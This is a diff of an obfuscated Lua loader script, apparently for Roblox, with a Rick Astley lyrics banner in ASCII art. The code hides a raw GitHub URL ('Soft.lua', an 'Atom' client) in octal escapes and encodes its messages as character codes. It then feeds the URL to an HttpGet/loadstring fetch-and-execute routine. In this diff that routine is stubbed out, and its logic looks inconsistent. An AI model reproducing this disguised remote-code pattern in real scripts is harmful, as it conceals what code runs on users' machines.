@@ -35,10 +35,10 @@
 ]]
 --[[
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀Never gonna give you up, never gonna let you down
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀ Never gonna run around and desert you
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀Never gonna make you cry, never gonna say goodbye
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀Never gonna tell a lie and hurt you
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀[Never gonna give you up, never gonna let you down]
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀ [Never gonna run around and desert you]
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀[Never gonna make you cry, never gonna say goodbye]
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀[Never gonna tell a lie and hurt you]
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀
@@ -54,6 +54,7 @@
 ]]
 
 local a = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
+
 local function b(b1)
     local b2 = ""
     local pos = 1
@@ -75,27 +76,33 @@ local function b(b1)
     end
     return b2
 end
+
 local function c(c1)
-    local c2 = {game = {HttpGet = function(_, url) return loadstring("print('Executed: "..url.."')") end}}
+    local c2 = {game = {HttpGet = function(_, url) return loadstring("print('Executed: "..url.."')")() end}}
     local c3, c4 = nil, nil
     local function c5(c6)
         c4 = c2.game:HttpGet(c6)
         if c4 then
             local c7 = {76, 97, 117, 110, 99, 104, 105, 110, 103, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
             local c8 = ""
-            for c9 = 1, #c7 do c8 = c8 .. string.char(c7[c9]) end
+            for c9 = 1, #c7 do
+                c8 = c8 .. string.char(c7[c9])
+            end
             warn(c8)
             c4()
         else
             local c10 = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
             local c11 = ""
-            for c12 = 1, #c10 do c11 = c11 .. string.char(c10[c12]) end
+            for c12 = 1, #c10 do
+                c11 = c11 .. string.char(c10[c12])
+            end
             warn(c11)
         end
     end
     c5(c1)
 end
-local d = (function(e)
+
+local d = (function()
     return function(f)
         local g = b(f)
         if g then
@@ -103,9 +110,12 @@ local d = (function(e)
         else
             local h = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116, 46}
             local i = ""
-            for j = 1, #h do i = i .. string.char(h[j]) end
+            for j = 1, #h do
+                i = i .. string.char(h[j])
+            end
             warn(i)
         end
     end
 end)()
+
 d(a)
